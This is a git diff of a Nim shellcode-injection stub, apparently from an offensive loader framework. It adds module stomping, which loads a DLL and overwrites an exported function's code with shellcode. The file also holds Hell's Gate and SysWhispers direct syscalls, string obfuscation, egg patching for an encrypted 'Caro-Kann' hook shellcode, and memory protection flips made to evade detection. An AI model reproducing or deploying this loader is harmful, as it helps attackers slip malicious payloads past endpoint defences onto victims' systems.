@@ -110,21 +110,90 @@ let LocalInjectStub*  = """
 
         else:
             when not defined(AllocateDripStyle):
-                when defined(SysWhispers):
-                    status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
-                else:
-                    status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
-
-                if not NT_SUCCESS(status):
-                    when defined(verbose):
-                        echo obf("[-] Failed to allocate memory.")
-                        quit(1)
-                else:
-                    when defined(verbose):
-                        when defined(RX):
-                            echo obf("[+] Allocated a page of memory with PAGE_READWRITE permissions")
+                when defined(stomb):
+                    # Get Module Handle for stombDll, if not found Load it
+                    module = GetModuleHandleA(stombDll)
+                    if(module == 0):
+                        module = LoadLibraryA(stombDll)
+                        if(module == 0):
+                            when defined(verbose):
+                                echo obf("[-] Failed to load stomb DLL "), stombDll
+                            quit(1)
                         else:
-                            echo obf("[+] Allocated a page of memory with PAGE_EXECUTE_READWRITE permissions")
+                            when defined(verbose):
+                                echo obf("[+] Loaded stomb DLL "), stombDll, " ", repr(module)
+                    else:
+                        when defined(verbose):
+                            echo obf("[+] stomb DLL already loaded "), stombDll," ", repr(module)
+
+                    # get the address of the function stombFunc via GetProcAddress
+
+                    buffer = GetProcAddress(cast[HMODULE](module), stombFunc)
+                    when defined(verbose):
+                        echo obf("[*] Found stomb function: "), repr(buffer), " ", stombFunc
+
+                    var allocationSize: SIZE_T = cast[SIZE_T](dataSz) + 0x1000
+                    
+                    when defined(restore):
+                        var textStart: LPVOID = cast[LPVOID](module) + 0x1000 # .text section always starts at this offset to the base address
+                        var mbi: MEMORY_BASIC_INFORMATION
+                        var sectionSize: SIZE_T = VirtualQueryEx(tProcess, textStart, addr mbi, sizeof(mbi))
+                        when defined(verbose):
+                            echo obf("[*] VirtualQueryEx result: "), sectionSize
+                            echo obf("[*] Section size: "), mbi.RegionSize
+                        
+                        var originalRXSection: seq[byte] = newSeq[byte](mbi.RegionSize)
+                        var numberOfBytesRead: SIZE_T
+
+                        when defined(Hellsgate):
+                            if getSyscall(ntReadTable):
+                                syscall = ntReadTable.wSysCall
+                            else:
+                                when defined(verbose):
+                                    echo obf("[-] Failed to find opcode for NtReadVirtualMemory")
+
+                        status = NtReadVirtualMemory(tProcess, textStart, unsafeAddr originalRXSection[0], mbi.RegionSize, addr numberOfBytesRead)
+                        
+                        when defined(verbose):
+                            if (status == 0):
+                                echo obf("[+] ReadProcessMemory success!")
+                            else:
+                                echo obf("[-] Failed to read the original RX section")
+                                quit(1)
+
+                    when defined(Hellsgate):
+                        if getSyscall(ntProtectTable):
+                            syscall = ntProtectTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                    var protectAddress: LPVOID = buffer
+                    var oProtect: DWORD
+                    status = NtProtectVirtualMemory(-1, addr protectAddress, addr allocationSize, PAGE_READWRITE, addr oProtect)
+                    when defined(verbose):
+                        if (status == 0):
+                            echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
+                        else:
+                            echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
+                            quit(1)
+                        echo "[*] Buffer address: ", repr(buffer)
+
+                else:
+                    when defined(SysWhispers):
+                        status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
+                    else:
+                        status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, protectionValue)
+
+                    if not NT_SUCCESS(status):
+                        when defined(verbose):
+                            echo obf("[-] Failed to allocate memory.")
+                            quit(1)
+                    else:
+                        when defined(verbose):
+                            when defined(RX):
+                                echo obf("[+] Allocated a page of memory with PAGE_READWRITE permissions")
+                            else:
+                                echo obf("[+] Allocated a page of memory with PAGE_EXECUTE_READWRITE permissions")
 
         when defined(AllocateDripStyle):
             buffer = DripAllocate(HANDLE(-1), cast[SIZE_T](friendlycode.len), friendlycode)
@@ -224,11 +293,11 @@ let LocalInjectStub*  = """
                             else:
                                 when defined(verbose):
                                     echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-
+                        var protectionAddress: LPVOID = buffer
                         when defined(syswhispers):
-                            status = uashdiasdj(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
+                            status = uashdiasdj(pHandle, &protectionAddress, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
                         else:
-                            status = NtProtectVirtualMemory(pHandle, &buffer, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
+                            status = NtProtectVirtualMemory(pHandle, &protectionAddress, &dataSz, PAGE_EXECUTE_READ, addr protectionValue)
                         when defined(verbose):
                             echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
                             if (status == 0):
@@ -255,7 +324,7 @@ let LocalInjectStub*  = """
                 #input = readLine(stdin)
 
         when defined(carokann):
-            var protectAddress: LPVOID = buffer
+            var protectedAddress: LPVOID = buffer
             var oldProtect: DWORD
             when defined(JmpEntry):
                 var tempdsAddress = buffer
@@ -274,29 +343,49 @@ let LocalInjectStub*  = """
             
 
             when defined(stomb):
-                var module = GetRemoteModuleHandle(tProcess, obf("Chakra.dll"))
+
+                # Get Module Handle for stombDll, if not found Load it
+                module = GetModuleHandleA(stombDll)
+                if(module == 0):
+                    module = LoadLibraryA(stombDll)
+                    if(module == 0):
+                        when defined(verbose):
+                            echo obf("[-] Failed to load stomb DLL "), stombDll
+                        quit(1)
+                    else:
+                        when defined(verbose):
+                            echo obf("[+] Loaded stomb DLL "), stombDll, " ", repr(module)
+                else:
+                    when defined(verbose):
+                        echo obf("[+] stomb DLL already loaded "), stombDll," ", repr(module)
+
+                # get the address of the function stombFunc2 via GetProcAddress
+
+                rPtr2 = GetProcAddress(module, stombFunc2)
                 when defined(verbose):
-                    echo obf("[*] Using Chakra.dll .text section as shellcode buffer")
-                    echo obf("[*] Found Chakra.dll baseAddress at: "), repr(rPtr2)
-                #rPtr2 = getTextSectionStart(rPtr2)
-                rPtr2 = GetRemoteProcAddress(tProcess, module, obf("DLLCanUnloadNow"))
-                #rPtr2 = rPtr2
-                when defined(verbose):
-                    echo obf("[*] Found Chakra.dll .text section at: "), repr(rPtr2)
+                    echo obf("[*] Found stomb function: "), repr(rPtr2)
                 
-                protectAddress = rPtr2
-                # as the function won't start at the section start, the protectAddress will have an
+                protectedAddress = rPtr2
+                # as the function won't start at the section start, the protectedAddress will have an
                 # offset to the address where we write the shellcode later on. This could lead to a problem,
                 # if the shellcode is too big and the function is not at the end of the section. 
                 # So we need to calculate the difference between the section start and the function start and may need to protect one more section
                 # Or we just allocate one more 4kB page so make sure the offset is no problem
-                var allocateSize: SIZE_T = sc_size2 + 0x1000
-                status = NtProtectVirtualMemory(-1, addr protectAddress, addr allocateSize, PAGE_READWRITE, addr oldProtect)
+                var allocateSize: SIZE_T = cast[SIZE_T](hook_sc_size) + 0x1000
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntProtectTable):
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+                status = NtProtectVirtualMemory(-1, addr protectedAddress, addr allocateSize, PAGE_READWRITE, addr oldProtect)
                 when defined(verbose):
                     if (status == 0):
-                        echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
+                        echo obf("[+] NtProtectVirtualMemory success! "), repr(protectedAddress)
                     else:
-                        echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectAddress)
+                        echo obf("[-] NtProtectVirtualMemory failed! "), repr(protectedAddress)
                         quit(1)
 
             else:
@@ -367,23 +456,6 @@ let LocalInjectStub*  = """
 
             copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr buffer, 8)
 
-            # There is another egg, 0xDE, 0xAD, 0x10, 0xAF - which we want to find and replace with the length of the first shellcode (calc64enc.bin)
-
-            eggIndex = 0
-
-            when defined(verbose):
-                echo obf("-------------------------------------------------------------")
-                echo obf("[*] Looking for the third egg, which will be filled with the shellcodes size")
-
-            for i in 0 ..< hookShellcodeBytes.len:
-                if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0x10) and (hookShellcodeBytes[i+3] == 0xAF):
-                    when defined(verbose):
-                        echo obf("[*] Found egg at index: "), i
-                    eggIndex = i
-                    break
-
-            when defined(verbose):
-                echo obf("[*] Writing shellcode length into egg: "), originalscLength
             
             when defined(stomb):
                 # We need to find and overwrite the egg 0x9999999999999999 with the address of the protectAddress, so that our shellcode knows where to re-protect
@@ -400,11 +472,8 @@ let LocalInjectStub*  = """
                         break
 
                 when defined(verbose):
-                    echo obf("[*] Writing memory address into the egg "), repr(protectAddress)
-                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr protectAddress, 8)
-
-            var shellcodeSize: DWORD = cast[DWORD](originalscLength)
-            copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr shellcodeSize, 4)
+                    echo obf("[*] Writing memory address into the egg "), repr(protectedAddress)
+                copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr protectedAddress, 8)
 
             # Finally write the decryptprotect.bin shellcode into the remote process
             
@@ -438,12 +507,12 @@ let LocalInjectStub*  = """
                         echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
 
             #var oldProtect: DWORD
-            protectAddress = rPtr2
-            status = NtProtectVirtualMemory(-1, addr protectAddress, addr hook_sc_size, PAGE_EXECUTE_READ, addr oldProtect)
+            protectedAddress = rPtr2
+            status = NtProtectVirtualMemory(-1, addr protectedAddress, addr hook_sc_size, PAGE_EXECUTE_READ, addr oldProtect)
 
             if (status == 0):
                 when defined(verbose):
-                    echo obf("[+] NtProtectVirtualMemory for Caro-Kann shellcode success! "), repr(protectAddress)
+                    echo obf("[+] NtProtectVirtualMemory for Caro-Kann shellcode success! "), repr(protectedAddress)
                     echo obf("    \\-- old protection: "), oldProtect
                     echo obf("")
             else:
